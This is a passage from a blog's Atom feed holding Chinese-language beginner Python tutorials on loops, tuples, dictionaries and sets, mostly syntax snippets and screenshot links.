id="特殊属性-name属性"><a href="#特殊属性-name属性" class="headerlink" title="特殊属性-name属性"></a>特殊属性-name属性</h4><p>在网络上看别人写的程序，一定会经常在程序末端看到下列叙述：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004205636412.png" alt="image-20201004205636412"></p><p>如果上述程序是自己执行，那么<strong>name</strong>就一定是<strong>main</strong>。如果被import到另一个程序，则<strong>name</strong>是本身的文件名。</p><p>总结就是<strong>name</strong>可以判别这个程序是自己执行或是被其他程序import导入当成模块使用。</p><h4 id="类的特殊方法–str–方法"><a href="#类的特殊方法–str–方法" class="headerlink" title="类的特殊方法–str–方法"></a>类的特殊方法–str–方法</h4><p>类的特殊方法，可以协助返回易读取的字符串。</p><p>如在定义<strong>str</strong>( )方法下，列出类的对象：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004210015409.png" alt="image-20201004210015409"></p><p>执行结果：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004210111832.png" alt="image-20201004210111832"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python-基础4</title>
    <link href="http://yoursite.com/2020/10/02/Python-%E5%9F%BA%E7%A1%804/"/>
    <id>http://yoursite.com/2020/10/02/Python-基础4/</id>
    <published>2020-10-02T07:15:33.000Z</published>
    <updated>2020-10-02T12:18:59.604Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="循环设计"><a href="#循环设计" class="headerlink" title="循环设计"></a>循环设计</h2><h4 id="基本for循环"><a href="#基本for循环" class="headerlink" title="基本for循环"></a>基本for循环</h4><p>for循环可以让程序将整个对象内的元素遍历(也可以称迭代)，在遍历期间，同时可以纪录或输出每次遍历的状态或称轨迹。for循环基本语法格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for var in 可迭代对象：</span><br><span class="line">    程序代码</span><br><span class="line">#将可迭代对象的元素当作var，重复执行，直到每个元素皆被执行一次，整个循环才会停止。</span><br></pre></td></tr></table></figure><p>可迭代对象(iterable object)可以是列表、元组、字典与集合或range( )，</p><p>如列出球员名称：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002152630616.png" alt="image-20201002152630616"></p><p>执行结果：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002152709207.png" alt="image-20201002152709207"></p><p>循环的流程示意图：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002152754322.png" alt="image-20201002152754322"></p><h4 id="for循环应用在列表"><a href="#for循环应用在列表" class="headerlink" title="for循环应用在列表"></a>for循环应用在列表</h4><p>Python也允许将for循环应用在截取区间列表元素上。</p><p>如列出列表前3和后三球员的名称：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002153012619.png" alt="image-20201002153012619"></p><p>tip：升幂是指由小到大排列。降幂是指由大到小排列。</p><h4 id="for循环应用在数据类别的判断"><a href="#for循环应用在数据类别的判断" class="headerlink" title="for循环应用在数据类别的判断"></a>for循环应用在数据类别的判断</h4><p>如有一个files列表内含一系列文件名，请将“.py”的Python程序另外建立到py列表，然后打印。</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002153355995.png" alt="image-20201002153355995"></p><h4 id="for循环删除列表内所有元素"><a href="#for循环删除列表内所有元素" class="headerlink" title="for循环删除列表内所有元素"></a>for循环删除列表内所有元素</h4><p>Python没有提供删除整个列表元素的方法，不过我们可以使用for循环完成此工作。</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002153514307.png" alt="image-20201002153514307"></p><h4 id="range-函数"><a href="#range-函数" class="headerlink" title="range()函数"></a>range()函数</h4><p>Python可以使用range( )函数产生一个等差序列，称这等差序列为可迭代对象(iterable object)，也可以称是range对象。由于range( )是产生等差序列，可以将此等差序列当作循环的计数器。</p><p>range的用法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">range(start,stop,step)</span><br></pre></td></tr></table></figure><p>stop是唯一必须的值，等差序列是产生stop的前一个值。</p><p>当range(n)函数搭配一个参数时：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">range(n) # 将产生0，1，...，n-1的可迭代对象内容</span><br></pre></td></tr></table></figure><h4 id="嵌套for循环"><a href="#嵌套for循环" class="headerlink" title="嵌套for循环"></a>嵌套for循环</h4><p>如果外循环要执行n次，内循环要执行m次，则整个循环执行的次数是n*m次，设计这类循环时要特别注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">外层循环的索引值与内层循环的索引值必须不同</span><br><span class="line">程序代码的内缩一定要小心</span><br></pre></td></tr></table></figure><p>嵌套循环基本语法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for 变量 in 对象：</span><br><span class="line">    ....</span><br><span class="line">    for 变量 in 对象：</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure><p>如打印9*9乘法表</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002154711352.png" alt="image-20201002154711352"></p><p>执行结果：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002154746535.png" alt="image-20201002154746535"></p><h4 id="结束循环break"><a href="#结束循环break" class="headerlink" title="结束循环break"></a>结束循环break</h4><p>某些条件发生时可以离开循环，可以在循环内执行break指令，即可立即离开循环，这个指令通常是和if语句配合使用。下列是常用的语法格式：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002154918808.png" alt="image-20201002154918808"></p><p>流程图如下：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002154955490.png" alt="image-20201002154955490"></p><h4 id="循环暂时停止continue"><a href="#循环暂时停止continue" class="headerlink" title="循环暂时停止continue"></a>循环暂时停止continue</h4><p>某些条件发生时可以不往下执行循环内容，此时可以用continue指令，这个指令通常是和if语句配合使用。下列是常用的语法格式：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002155121884.png" alt="image-20201002155121884"></p><p>流程图如下：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002155156087.png" alt="image-20201002155156087"></p><h4 id="for-else循环"><a href="#for-else循环" class="headerlink" title="for else循环"></a>for else循环</h4><p>如果期待所有的if叙述条件是False时，在最后一次循环后，可以执行特定程序区块指令，这个指令通常是和if和break语句配合使用。下列是常用的语法格式：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002155330311.png" alt="image-20201002155330311"></p><p> 流程图如下：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002155405810.png" alt="image-20201002155405810"></p><p>如数学中测试某一个数字n是否是质数，质数的条件是：</p><p>2是质数，n不可被2至n-1的数字整除。</p><p>如果所输入的数字是质数则列出是质数，否则列出不是质数。</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002155555414.png" alt="image-20201002155555414"></p><h4 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h4><p>一直执行直到条件运算为False才会离开循环，所以设计while循环时一定要设计一个条件可以离开循环，相当于让循环结束。程序设计时，如果忘了设计条件可以离开循环，程序造成无限循环状态。</p><p>语法格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">while 条件运算：</span><br><span class="line">   程序区块</span><br></pre></td></tr></table></figure><p>while语法流程图：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002155746278.png" alt="image-20201002155746278"></p><p>如猜数字游戏，程序用变量answer存储欲猜的数字，程序执行时用变量guess存储所猜的数字：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002155850070.png" alt="image-20201002155850070"></p><h4 id="pass"><a href="#pass" class="headerlink" title="pass"></a>pass</h4><p>pass指令是什么事也不做，如果想要建立一个无限循环可以使用下列写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">while True:</span><br><span class="line">   pass</span><br></pre></td></tr></table></figure><h2 id="元组Tuple"><a href="#元组Tuple" class="headerlink" title="元组Tuple"></a>元组Tuple</h2><p>Python提供一种数据类型称元组(tuple)，这种数据类型结构与列表完全相同，但是它与列表最大的差异是，它的元素值与元素个数不可更改。</p><h4 id="元组的定义"><a href="#元组的定义" class="headerlink" title="元组的定义"></a>元组的定义</h4><p>列表在定义时是将元素放在中括号内，元组的定义则是将元素放在小括号“( )”内，元组的语法格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tuple_1 &#x3D; (元素1，元素2....)</span><br><span class="line"></span><br><span class="line">tuple2&#x3D;(元素1，) #只有一个元素的元组</span><br></pre></td></tr></table></figure><p>元组的每一个数据称元素，元素可以是整数、字符串或列表等，这些元素放在小括号( )内，彼此用逗号“,”隔开。如果要打印元组内容，可以用print( )函数，将元组名称当作变量名称即可。</p><h4 id="读取元组数据"><a href="#读取元组数据" class="headerlink" title="读取元组数据"></a>读取元组数据</h4><p>定义元组时是使用小括号“( )”，如果想要读取元组内容，和列表是一样的，用中括号“[ ]”。在Python中元组元素是从索引值0开始配置。所以如果是元组的第一个元素，索引值是0，第二个元素索引值是1。</p><p>语法格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tuple1[i] #读取索引i的元组元素</span><br></pre></td></tr></table></figure><h4 id="遍历元组数据"><a href="#遍历元组数据" class="headerlink" title="遍历元组数据"></a>遍历元组数据</h4><p>在Python可以使用for循环遍历所有元组元素。</p><p>如假设元组是由字符串和数值组成的密码：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002163223009.png" alt="image-20201002163223009"></p><h4 id="重新定义元组"><a href="#重新定义元组" class="headerlink" title="重新定义元组"></a>重新定义元组</h4><p>如果想要修改元组元素，可以使用重新定义元组方式处理。</p><p>如用重新定义方式修改元组元素内容：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002163611561.png" alt="image-20201002163611561"></p><h4 id="元组切片"><a href="#元组切片" class="headerlink" title="元组切片"></a>元组切片</h4><p>元组切片观念与列表切片观念相同。</p><p>元组切片的应用：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002163846961.png" alt="image-20201002163846961"></p><h4 id="方法与函数"><a href="#方法与函数" class="headerlink" title="方法与函数"></a>方法与函数</h4><p>应用在列表上的方法或函数如果不会更改元组内容，则可以将它应用在元组，如len( )。如果会更改元组内容，则不可以将它应用在元组，如append( )、insert( )或pop( )。</p><p>如列出元组元素长度（个数）:</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002164045777.png" alt="image-20201002164045777"></p><h4 id="列表与元组数据互换"><a href="#列表与元组数据互换" class="headerlink" title="列表与元组数据互换"></a>列表与元组数据互换</h4><p>有需要将列表(list)与元组(tuple)数据类型互换，可以使用下列指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list():将元组数据类型改为列表</span><br><span class="line"></span><br><span class="line">tuple():将列表数据类型改为元组</span><br></pre></td></tr></table></figure><p>获取最大值、最小值：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002164525223.png" alt="image-20201002164525223"></p><h4 id="zip函数"><a href="#zip函数" class="headerlink" title="zip函数"></a>zip函数</h4><p>这是一个内置函数，参数内容主要是可迭代(iterable)的对象，如列表等。然后将相对应的元素打包成元组(tuple)，最后传给zip对象，可以使用list( )函数将zip对象转成列表。</p><p>zip的应用：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002164842327.png" alt="image-20201002164842327"></p><p>执行结果：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002164912719.png" alt="image-20201002164912719"></p><p>如果在zip( )函数内增加“*”符号，相当于可以unzip( )列表。</p><p>如恢复zip前的列表：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002165030151.png" alt="image-20201002165030151"></p><p>执行结果：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002165054580.png" alt="image-20201002165054580"></p><h4 id="元组的优点"><a href="#元组的优点" class="headerlink" title="元组的优点"></a>元组的优点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以更安全的保护数据。</span><br><span class="line">加快程序的执行速度，元组(tuple)结构比列表(list)简单，占用较少的系统资源，程序执行时速度比较快。</span><br></pre></td></tr></table></figure><h2 id="字典Dict"><a href="#字典Dict" class="headerlink" title="字典Dict"></a>字典Dict</h2><p>列表(list)与元组(tuple)是依序排列是序列数据结构，只要知道元素的特定位置，即可使用索引观念取得元素内容。字典并不是依序排列的数据结构，通常可称是非序列数据结构，所以无法使用类似列表的数值(0, 1, … n)索引观念取得元素内容。</p><h4 id="定义字典"><a href="#定义字典" class="headerlink" title="定义字典"></a>定义字典</h4><p>字典也是一个列表型的数据结构，但是它的元素是用“键-值”方式配对存储，在操作时是用键(key)取得值(value)的内容。定义字典时，是将键-值放在大括号“{}”内，字典的语法格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict_1 &#x3D; &#123;键1:值1,.....,键n:值n&#125;</span><br></pre></td></tr></table></figure><p>字典的值(value)可以是任何Python的对象，可以是数值、字符串、列表等</p><h4 id="列出字典元素的值"><a href="#列出字典元素的值" class="headerlink" title="列出字典元素的值"></a>列出字典元素的值</h4><p>字典的元素是“键-值”配对设定，如果想要取得元素的值，可以将键当作是索引方式处理，因此字典内的元素不可有重复的键。</p><p>传回键值的语法格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fruits[&#39;水蜜桃&#39;]  #用字典变量[&#39;键&#39;]取得值</span><br></pre></td></tr></table></figure><h4 id="增加字典元素"><a href="#增加字典元素" class="headerlink" title="增加字典元素"></a>增加字典元素</h4><p>可使用下列语法格式增加字典元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict_1 [键] &#x3D; 值 #dict_1为字典变量</span><br></pre></td></tr></table></figure><p>如为fruits字典增加橘子一斤18元：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002170216824.png" alt="image-20201002170216824"></p><h4 id="删除字典特定元素"><a href="#删除字典特定元素" class="headerlink" title="删除字典特定元素"></a>删除字典特定元素</h4><p>删除字典的特定元素的语法格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del  dict_1[键] #删除特定键的元素</span><br></pre></td></tr></table></figure><h4 id="删除所有字典元素"><a href="#删除所有字典元素" class="headerlink" title="删除所有字典元素"></a>删除所有字典元素</h4><p>Python有提供方法clear( )可以将字典的所有元素删除，此时字典仍然存在，不过将变成空的字典。</p><p>如删除fruits字典的所有元素：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002170528529.png" alt="image-20201002170528529"></p><p>Python也有提供del指令可以将整个字典删除，字典一经删除就不再存在。它的语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del dict_1</span><br></pre></td></tr></table></figure><p>在程序设计时，也允许先建立一个空字典，建立空字典的语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict_2 &#x3D;&#123;&#125;</span><br></pre></td></tr></table></figure><h4 id="字典的复制"><a href="#字典的复制" class="headerlink" title="字典的复制"></a>字典的复制</h4><p>为了要保护原先字典内容，常会需要将字典复制，语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new_dict &#x3D; dict_1.copy()</span><br></pre></td></tr></table></figure><p>上述所复制的字典是独立存在新地址的字典。</p><h4 id="取得字典元素的数量"><a href="#取得字典元素的数量" class="headerlink" title="取得字典元素的数量"></a>取得字典元素的数量</h4><p>在列表(list)或元组(tuple)使用的方法len( )也可以应用在字典，它的语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length&#x3D; len(dict_1)</span><br></pre></td></tr></table></figure><p>可以用下列语法验证元素是否存在：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">键 in dict_1 #验证键元素是否存在</span><br></pre></td></tr></table></figure><h4 id="遍历字典"><a href="#遍历字典" class="headerlink" title="遍历字典"></a>遍历字典</h4><p>1.遍历字典的键-值</p><p>Python有提供方法items( )，可以让我们取得字典键-值配对的元素：</p><p>如使用for循环加items()方法</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002171650626.png" alt="image-20201002171650626"></p><p>2.遍历字典的键</p><p>不想要取得字典的值(value)，只想要键(keys)，Python有提供方法keys( )，可以取得字典的键内容。</p><p>3.遍历字典的值</p><p>Python有提供方法values( )，可以取得字典值列表。</p><p>如使用for循环加上values( )方法取得字典的值：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002172037258.png" alt="image-20201002172037258"></p><p>在字典的应用中键不可有重复，值是可以重复。</p><h4 id="字典内含列表元素"><a href="#字典内含列表元素" class="headerlink" title="字典内含列表元素"></a>字典内含列表元素</h4><p>在Python的应用中也允许将列表放在字典内，这时列表将是字典某键的值。如果想要遍历这类数据结构，需要使用嵌套循环和字典的方法items( )，外层循环是取得字典的键，内层循环则是将含列表的值拆解。</p><p>如定义内含字符串的字典，然后再拆解打印：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002172510824.png" alt="image-20201002172510824"></p><h4 id="字典常用函数和方法"><a href="#字典常用函数和方法" class="headerlink" title="字典常用函数和方法"></a>字典常用函数和方法</h4><p>len():可以列出字典元素的个数。</p><p>get():搜寻字典的键，如果键存在则传回该键的值，如果不存在则传回默认值，ret_value = dict.get(key),default=none。</p><p>fromkeys():建立字典的一个方法。</p><p>setdefault()方法基本上与get( )相同，不同之处在于get( )方法不会改变字典内容。使用setdefault( )方法时若所搜寻的键不在，会将键-值加入字典，如果有设定默认值则将键:默认值加入字典，如果没有设定默认值则将键:None加入字典。</p><p>pop(): 这个方法可以删除字典元素，它的语法格式如下：</p><p>ret.value = dict.pop(key)</p><h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>集合的基本观念是无序且每个元素是唯一的，集合元素的内容是不可变的(immutable)，常见的元素有整数(intger)、浮点数(float)、字符串(string)、元组(tuple)等。至于可变(mutable)内容列表(list)、字典(dict)、集合(set)等不可以是集合元素。</p><h4 id="建立集合"><a href="#建立集合" class="headerlink" title="建立集合"></a>建立集合</h4><p>Python可以使用大括号“{ }”或set( )函数建立集合。</p><p>Python允许我们直接使用大括号“{ }”设定集合，如：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002174052833.png" alt="image-20201002174052833"></p><p>集合的特色是元素是唯一的，所以如果设定集合时有重复元素情形，多的部分将被舍去。</p><p>可以使用内置的set( )函数建立集合，set( )函数参数的内容可以是字符串(string)、列表(list)、元组(tuple)等。这时原先字符串(string)、列表(list)、元组(tuple)的元素将被转成集合元素。</p><p>如使用set( )函数建立空集合：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002174250783.png" alt="image-20201002174250783"></p><h4 id="大数据与集合的应用"><a href="#大数据与集合的应用" class="headerlink" title="大数据与集合的应用"></a>大数据与集合的应用</h4><p>在海量数据中将重复的数据删除，只要将列表数据使用set( )函数转为集合数据，再使用list( )函数将集合数据转为列表数据就可以了。</p><p>如将列表内重复性的数据删除：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002174548719.png" alt="image-20201002174548719"></p><p>执行结果：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002174628978.png" alt="image-20201002174628978"></p><h4 id="集合的操作"><a href="#集合的操作" class="headerlink" title="集合的操作"></a>集合的操作</h4><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002174706619.png" alt="image-20201002174706619"></p><h4 id="交集"><a href="#交集" class="headerlink" title="交集"></a>交集</h4><p>在Python语言的交集符号是“&amp;”，另外，也可以使用intersection( )方法完成这个工作。</p><p>如有数学与物理2个夏令营，这个程序会列出同时参加这2个夏令营的成员：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002174821819.png" alt="image-20201002174821819"></p><h4 id="并集"><a href="#并集" class="headerlink" title="并集"></a>并集</h4><p>在Python语言的并集符号是“|”，另外，也可以使用union( )方法完成这个工作。</p><p>如有数学与物理2个夏令营，这个程序会列出参加这2个夏令营的所有成员：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002174939938.png" alt="image-20201002174939938"></p><h4 id="差集"><a href="#差集" class="headerlink" title="差集"></a>差集</h4><p>有A和B两个集合，如果想获得属于A集合元素，同时不属于B集合则可以使用差集(A-B)。如果想获得属于B集合元素，同时不属于A集合则可以使用差集(B-A)。</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002175319303.png" alt="image-20201002175319303"></p><p>在Python语言的差集符号是“-”，另外，也可以使用difference( )方法完成这个工作。</p><p>如有数学与物理2个夏令营，列出参加数学夏令营但是没有参加物理夏令营的所有成员。列出参加物理夏令营但是没有参加数学夏令营的所有成员：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002175158969.png" alt="image-20201002175158969"></p><p>使用difference( )方法完成A-B差集与B-A差集的应用：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002175247473.png" alt="image-20201002175247473"></p><h4 id="对称差集"><a href="#对称差集" class="headerlink" title="对称差集"></a>对称差集</h4><p>有A和B两个集合，如果想获得属于A或是B集合元素，但是排除同时属于A和B的元素，则可以使用对称差集。</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002175414485.png" alt="image-20201002175414485"></p><p>在Python语言的对称差集符号是“^”，另外，也可以使用symmetric_difference( )方法完成。</p><p>如有数学与物理2个夏令营，列出参加数学夏令营或参加物理夏令营，但是排除同时参加2个夏令营的所有成员：</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002175517327.png" alt="image-20201002175517327"></p><h4 id="等于和不等于"><a href="#等于和不等于" class="headerlink" title="等于和不等于"></a>等于和不等于</h4><p>等于的Python符号是“==”，可以得知2个集合是否相等，如果相等传回True，否则传回False。</p><p>不等于的Python符号是“!=”，可以得知2个集合是否不相等，如果不相等传回True，否则传回False。</p><h4 id="是成员in与不是成员"><a href="#是成员in与不是成员" class="headerlink" title="是成员in与不是成员"></a>是成员in与不是成员</h4><p>Python的关键词in可以测试元素是否是集合的元素成员。</p><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002175718711.png" alt="image-20201002175718711"></p><p>Python的关键词not in可以测试元素是否不是集合的元素成员。</p><h4 id="适合集合的方法"><a href="#适合集合的方法" class="headerlink" title="适合集合的方法"></a>适合集合的方法</h4><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002175835796.png" alt="image-20201002175835796"></p><h4 id="add"><a href="#add" class="headerlink" title="add()"></a>add()</h4><p>add( )可以增加一个元素，它的语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">集合A.add(新增元素)</span><br></pre></td></tr></table></figure><h4 id="copy"><a href="#copy" class="headerlink" title="copy()"></a>copy()</h4><p>集合复制像列表复制一样，有深复制(deep copy)与浅复制(shallowcopy)，这个方法不需参数，语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">新集合名称 &#x3D; 旧集合名称.copy()</span><br></pre></td></tr></table></figure><p>copy( )是浅复制，经过复制后未来一个集合内容改变时，不会影响到另一个集合的内容。</p><h4 id="remove"><a href="#remove" class="headerlink" title="remove()"></a>remove()</h4><p>如果指定删除的元素存在集合内，remove( )可以删除这个集合元素；如果指定删除的元素不存在集合内，将有KeyError产生。它的语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">集合A.remove(欲删除的元素)</span><br></pre></td></tr></table></figure><h4 id="discard"><a href="#discard" class="headerlink" title="discard()"></a>discard()</h4><p>discard( )可以删除集合的元素，如果元素不存在也不会有错误产生。语法格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retvalue &#x3D; 集合A.discard(欲删除的元素)</span><br></pre></td></tr></table></figure><p>会将集合A内，discard( )参数指定的元素删除。不论删除结果为何，这个方法会传回None。</p><h4 id="pop"><a href="#pop" class="headerlink" title="pop()"></a>pop()</h4><p>pop( )是用随机方式删除集合元素，所删除的元素将被传回，如果集合是空集合则程序会产生TypeError错误。</p><p>使用格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret &#x3D; 集合A.pop()</span><br></pre></td></tr></table></figure><p>会随机删除集合A内的元素，所删除的元素将被传回ret_element。</p><h4 id="clear"><a href="#clear" class="headerlink" title="clear()"></a>clear()</h4><p>clear会删除集合内所有元素，传回值是None。</p><h4 id="两个集合间"><a href="#两个集合间" class="headerlink" title="两个集合间"></a>两个集合间</h4><p>isdisjoint( )：</p><p>如果2个集合没有共同的元素会传回True，否则传回False。用法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret_bolan &#x3D; 集合A.isdisjoint(集合B)</span><br></pre></td></tr></table></figure><p>issubset():</p><p>这个方法可以测试一个函数是否是另一个函数的子集合，例如，A集合所有元素均可在B集合内发现，则A集合是B集合的子集合。如果是则传回True，否则传回False。</p><p>用法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret_bolan &#x3D; 集合A.issubset(集合B)</span><br></pre></td></tr></table></figure><p>issuperset():</p><p>这个方法可以测试一个函数是否是另一个函数的父集合，例如，B集合所有元素均可在A集合内发现，则A集合是B集合的父集合。如果是则传回True，否则传回False。</p><p>intersection update( ):</p><p>这个方法将传回集合的交集，它的语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret &#x3D; A.intersection_update(*B):</span><br></pre></td></tr></table></figure><p>上述<em>B代表可以有1到多个集合，如果只有一个集合，例如是B，则执行后A将是A与B的交集。如果</em>B代表(B, C)，则执行后A将是A、B与C的交集。</p><p>update():</p><p>可以将一个集合的元素加到调用此方法的集合内，它的语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">集合A.update(集合B)  #将集合B的元素加到集合A内</span><br></pre></td></tr></table></figure><p>difference update():</p><p>可以删除集合内与另一集合重复的元素，它的语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">集合A.difference update(集合B)  #集合A内与集合B重复的元素删除，结果存在A集合</span><br></pre></td></tr></table></figure><h4 id="适用于集合的基本函数操作"><a href="#适用于集合的基本函数操作" class="headerlink" title="适用于集合的基本函数操作"></a>适用于集合的基本函数操作</h4><p><img src="/2020/10/02/Python-%E5%9F%BA%E7%A1%804/image-20201002201804967.png" alt="image-20201002201804967"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python-基础3</title>
    <link href="http://yoursite.com/2020/09/25/Python-%E5%9F%BA%E7%A1%803/"/>
    <id>http://yoursite.com/2020/09/25/Python-基础3/</id>
    <published>2020-09-25T13:10:14.000Z</published>
    <updated>2020-10-02T07:20:36.064Z</updated>
    
